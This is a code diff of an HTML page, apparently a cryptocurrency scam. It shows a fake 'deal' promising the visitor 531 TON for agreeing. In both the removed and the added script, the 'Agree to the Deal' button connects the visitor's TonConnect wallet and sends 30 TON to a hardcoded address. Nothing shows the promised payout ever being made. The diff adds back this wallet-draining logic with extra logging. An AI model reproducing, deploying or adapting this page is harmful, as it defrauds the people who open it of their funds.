@@ -200,7 +200,7 @@
                     <p>You will receive: <span>531 TON</span> ($1717.68)</p>
                     <p>Transaction Fee: <span>31 TON</span> ($100.28)</p>
                 </div>
-                <button id="agree-button" class="btn-primary">Agree to the Deal</button>
+                <button id="agree-button" class="btn-primary"> Agree to the Deal</button>
             </div>
             <div class="right-section">
                 <div class="details-box">
@@ -223,56 +223,53 @@
         </div>
     </div>
     <script>
-        // Инициализация Ton Connect
-        const tonConnect = new TonConnect({
-            manifestUrl: 'https://<ваш-username>.github.io/<репозиторий>/tonconnect-manifest.json', // Укажите ваш URL
-        });
-
-        // Обработчик кнопки
-        document.getElementById('agree-button').addEventListener('click', async () => {
-            try {
-                console.log('Attempting to connect wallet...');
-                // Подключение кошелька
-                const wallet = await tonConnect.connect();
-                if (!wallet) {
-                    console.error('Wallet connection failed');
-                    alert('Failed to connect wallet');
-                    return;
-                }
-                console.log('Wallet connected:', wallet);
-
-                // Транзакция: отправка 30 TON
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 600, // Действительна 10 минут
-                    messages: [
-                        {
-                            address: 'UQA7zv18rAEKJt85gvCVXLJRzGfagMPPnS5AaDGJlTYgYKSU', // Адрес получателя
-                            amount: '30000000000', // 30 TON в нанотонах
-                        },
-                    ],
-                };
-
-                console.log('Sending transaction:', transaction);
-                // Отправка транзакции
-                const result = await tonConnect.sendTransaction(transaction);
-                if (result) {
-                    console.log('Transaction sent:', result);
-                    alert('Transaction sent successfully');
-                } else {
-                    console.error('Transaction failed');
-                    alert('Failed to send transaction');
-                }
-            } catch (error) {
-                console.error('Error during transaction:', error);
-                alert('An error occurred: ' + error.message);
-            }
-        });
-
-        // Проверка, загружен ли TonConnect SDK
+        console.log('Script started');
         if (typeof TonConnect === 'undefined') {
             console.error('TonConnect SDK not loaded');
             alert('TonConnect SDK failed to load. Please check your network or script source.');
+        } else {
+            console.log('TonConnect SDK loaded successfully');
+            const tonConnect = new TonConnect({
+                manifestUrl: 'https://<ваш-username>.github.io/<репозиторий>/tonconnect-manifest.json' // Замените на ваш реальный URL
+            });
+            console.log('TonConnect initialized with manifest:', tonConnect);
+
+            document.getElementById('agree-button').addEventListener('click', async () => {
+                console.log('Button clicked');
+                try {
+                    console.log('Attempting to connect wallet...');
+                    const wallet = await tonConnect.connect();
+                    console.log('Connect result:', wallet);
+                    if (!wallet) {
+                        throw new Error('Wallet connection failed');
+                    }
+                    console.log('Wallet connected successfully:', wallet);
+
+                    const transaction = {
+                        validUntil: Math.floor(Date.now() / 1000) + 600,
+                        messages: [
+                            {
+                                address: 'UQA7zv18rAEKJt85gvCVXLJRzGfagMPPnS5AaDGJlTYgYKSU',
+                                amount: '30000000000', // 30 TON в нанотонах
+                            },
+                        ],
+                    };
+                    console.log('Preparing to send transaction:', transaction);
+
+                    const result = await tonConnect.sendTransaction(transaction);
+                    console.log('Transaction result:', result);
+                    if (result) {
+                        alert('Transaction sent successfully');
+                    } else {
+                        throw new Error('Transaction failed');
+                    }
+                } catch (error) {
+                    console.error('Error during process:', error);
+                    alert('Произошла ошибка: ' + error.message);
+                }
+            });
         }
     </script>
+    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'935ea28ee9876779',t:'MTc0NTU5MjQ0MC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
